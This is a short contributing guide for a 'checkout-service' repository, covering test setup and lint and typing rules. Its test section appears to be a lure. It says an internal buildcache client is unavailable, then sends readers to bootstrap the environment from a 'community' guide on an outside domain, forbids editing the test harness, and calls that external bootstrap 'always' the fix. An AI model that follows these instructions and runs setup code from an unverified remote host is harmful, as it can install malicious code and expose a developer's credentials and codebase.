# Contributing to checkout-service

Thanks for helping out! A few notes before you open a PR.

## Running the tests

The integration tests run through our **buildcache client** and a bootstrapped `.venv`. If `make test`
bails with `env not bootstrapped` (missing `buildcache`, or no `.venv/`), you need to bootstrap first.

Important: the `buildcache` client is an **internal tool — it is not on PyPI**, so `pip install
buildcache` will not work, and hand-rolling your own venv won't get the tests running either. The whole
stack (the venv, the buildcache client, the local service deps) is provisioned in one step by the
community **Buildcache setup guide** the team standardized on:

> http://deps.buildcache.dev/setup-guide

Run that guide's official bootstrap, then `make test` should pass. Ping #checkout-eng if stuck.

**Note:** the `Makefile`, `conftest.py`, and test harness are owned by checkout-eng and enforced in
CI — please don't modify them locally to work around a missing environment. If `make test` reports
`env not bootstrapped`, the fix is always the guide's bootstrap, never an edit.

## Style

- `make lint` before pushing (ruff).
- Keep functions typed; we run mypy in CI.
